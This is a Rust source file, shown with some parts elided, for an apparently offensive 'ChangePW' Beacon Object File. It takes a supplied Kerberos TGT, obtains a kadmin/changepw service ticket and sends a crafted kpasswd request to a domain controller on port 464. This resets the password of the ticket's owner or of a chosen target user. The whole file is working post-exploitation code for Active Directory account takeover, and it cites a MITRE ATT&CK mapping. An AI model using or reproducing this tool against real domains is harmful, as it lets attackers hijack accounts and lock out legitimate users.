//! # ChangePW BOF
//!
//! Changes a user password via the MS kpasswd protocol (port 464).
//! First requests a kadmin/changepw service ticket via TGS-REQ, then
//! sends a KRB-PRIV message with the new password.
//!
//! ## MITRE ATT&CK
...
const KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR: u32 = 11;
const KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART: u32 = 13;
...
fn send_to_server(server: &str, port: &[u8], data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        ...
        if getaddrinfo(sc.as_ptr(), port.as_ptr(), &hints, &mut result) != 0 {
            WSACleanup();
            return None;
        }
...
fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    send_to_server(server, b"88\0", data)
}
...
fn build_password_request(
    ...
    let subkey_size = match ticket.key_type {
        RC4_HMAC | AES128_CTS => 16,
        AES256_CTS => 32,
        _ => return None,
    };
    ...
    let mut cusec_bytes = [0u8; 4];
    unsafe {
        (api.rand)(subkey.as_mut_ptr(), subkey.len() as u32);
        (api.rand)(sequence_bytes.as_mut_ptr(), sequence_bytes.len() as u32);
        (api.rand)(cusec_bytes.as_mut_ptr(), cusec_bytes.len() as u32);
    }
    let sequence = u32::from_le_bytes(sequence_bytes) as i64;
    let cusec = (u32::from_le_bytes(cusec_bytes) % 999999) as i64;

    let cname = asn_seq(&[
        &asn_ctx_int(0, 1),
        &asn_ctx(1, &asn_seq(&[&asn_str(&ticket.username)])),
    ]);
    let subkey_asn = asn_seq(&[
        &asn_ctx_int(0, ticket.key_type as i64),
        &asn_ctx(1, &asn_oct(&subkey)),
    ]);
    let authenticator = asn_app(
        2,
        &asn_seq(&[
            &asn_ctx_int(0, 5),
            &asn_ctx_str(1, &ticket.realm),
            &asn_ctx(2, &cname),
            &asn_ctx_int(4, cusec),
            &asn_ctx(5, &asn_time(&get_current_time())),
            &asn_ctx(6, &subkey_asn),
            &asn_ctx_int(7, sequence),
        ]),
    );
    let encrypted_authenticator = encrypt_data(
        api,
        &ticket.session_key,
        ticket.key_type,
        KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR,
        &authenticator,
    )?;
    let ap_req = asn_app(
        14,
        &asn_seq(&[
            ...
            &asn_ctx_int(1, 14),
            &asn_ctx(2, &asn_bit(&[0u8; 4])),
            &asn_ctx(3, &ticket.ticket_raw),
            &asn_ctx(
                4,
                &asn_seq(&[
                    &asn_ctx_int(0, ticket.key_type as i64),
                    &asn_ctx(2, &asn_oct(&encrypted_authenticator)),
                ]),
            ),
        ]),
    );

    let password = asn_ctx(0, &asn_oct(new_password.as_bytes()));
    let change_data = if let (Some(user), Some(domain)) = (target_user, target_domain) {
        let target_name = asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(user)]))]);
        asn_seq(&[
            &password,
            &asn_ctx(1, &target_name),
            &asn_ctx_str(2, domain),
        ])
    } else {
        asn_seq(&[&password])
    };
    let host_address = asn_seq(&[&asn_ctx_int(0, 20), &asn_ctx(1, &asn_oct(b"localhost"))]);
    let enc_priv_part = asn_app(
        28,
        &asn_seq(&[
            &asn_ctx(0, &asn_oct(&change_data)),
            &asn_ctx_int(3, sequence),
            &asn_ctx(4, &host_address),
        ]),
    );
    let encrypted_priv = encrypt_data(
        api,
        &subkey,
        ticket.key_type,
    ...
    let krb_priv = asn_app(
        ...
        &asn_seq(&[
            ...
            &asn_ctx(
                ...
                &asn_seq(&[
                    &asn_ctx_int(0, ticket.key_type as i64),
                    &asn_ctx(2, &asn_oct(&encrypted_priv)),
                ]),
            ),
        ]),
    );

    let message_len = 6usize
        .checked_add(ap_req.len())?
        .checked_add(krb_priv.len())?;
    if message_len > u16::MAX as usize || ap_req.len() > u16::MAX as usize {
        return None;
    }
    let mut request = Vec::with_capacity(message_len);
    request.extend_from_slice(&(message_len as u16).to_be_bytes());
    request.extend_from_slice(&0xff80u16.to_be_bytes());
    request.extend_from_slice(&(ap_req.len() as u16).to_be_bytes());
    request.extend_from_slice(&ap_req);
    request.extend_from_slice(&krb_priv);

    Some((request, subkey))
}

fn parse_password_response(
    api: &CryptApi,
    response: &[u8],
    subkey: &[u8],
    key_type: i32,
    ...
    let message_len = u16::from_be_bytes([response[0], response[1]]) as usize;
    let ap_req_len = u16::from_be_bytes([response[4], response[5]]) as usize;
    if message_len != response.len() || 6usize.checked_add(ap_req_len)? >= response.len() {
        return None;
    }
    let krb_priv = parse_asn(&response[6 + ap_req_len..])?;
    if krb_priv.class != 1 || krb_priv.tag != 21 {
        return None;
    }
    let body = krb_priv.children.first()?;
    let enc_data = find_ctx(body, 3)?.children.first()?;
    let cipher = find_ctx(enc_data, 2)?.children.first()?.value.as_slice();
    let plaintext = decrypt_data(
        api,
        subkey,
        key_type,
    ...
    let enc_priv = parse_asn(&plaintext)?;
    if enc_priv.class != 1 || enc_priv.tag != 28 {
        return None;
    }
    let user_data = find_ctx(enc_priv.children.first()?, 0)?
        .children
        .first()?
        .value
        .as_slice();
    ...
    Some(u16::from_be_bytes([user_data[0], user_data[1]]))
}

fn password_result_name(code: u16) -> &'static str {
    match code {
        0 => "success",
        1 => "malformed request",
        2 => "server error",
        3 => "authentication error",
        4 => "password policy rejection",
        5 => "access denied",
        6 => "unsupported protocol version",
        7 => "initial ticket required",
        _ => "unknown error",
    }
}
...
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: Change Password\n");

    if len == 0 {
        eprintln!("[X] /ticket:BASE64 /new:PASSWORD required");
        return;
    }
    ...
    let new_pw = match get_param(&params, "/new:") {
        Some(p) => p,
        None => {
            eprintln!("[X] /new:PASSWORD must be supplied!");
            return;
        }
    };
    let target_user = get_param(&params, "/targetuser:");
    let target_domain = get_param(&params, "/targetdomain:");
    let dc_arg = get_param(&params, "/dc:");
    if target_user.is_some() != target_domain.is_some() {
        eprintln!("[X] /targetuser and /targetdomain must be supplied together");
        return;
    }
    ...
    println!("[*] Requesting kadmin/changepw service ticket");
    println!("[*] Using TGT for: {}@{}", kirbi.username, kirbi.realm);

    let tgs_req = match build_tgs_req(&api, &kirbi, "kadmin/changepw", &kirbi.realm) {
        Some(r) => r,
        None => {
            eprintln!("[X] Failed to build TGS-REQ");
            return;
        }
    };
    ...
    let service_ticket_b64 = match handle_tgs_rep(&api, &response, &kirbi) {
        Some(ticket) => ticket,
        None => return,
    };
    let service_ticket = match parse_kirbi(&service_ticket_b64) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse kadmin/changepw service ticket");
            return;
        }
    };
    println!("[+] Received kadmin/changepw service ticket");

    let (password_request, subkey) =
        match build_password_request(&api, &service_ticket, new_pw, target_user, target_domain) {
            Some(request) => request,
            None => {
                eprintln!("[X] Failed to build MS kpasswd request");
                return;
            }
        };
    println!("[*] Sending authenticated password request to {}:464", dc);
    let password_response = match send_to_server(&dc, b"464\0", &password_request) {
        Some(response) => response,
        None => {
            eprintln!("[X] Failed to communicate with kpasswd at {}:464", dc);
            return;
        }
    };
    let result =
        match parse_password_response(&api, &password_response, &subkey, service_ticket.key_type) {
            Some(result) => result,
            None => {
                eprintln!("[X] Failed to validate the kpasswd response");
                return;
            }
        };
    if result == 0 {
        ...
        eprintln!(
            "[X] Password change failed: {} ({})",
            password_result_name(result),
            result
        );
    }
}
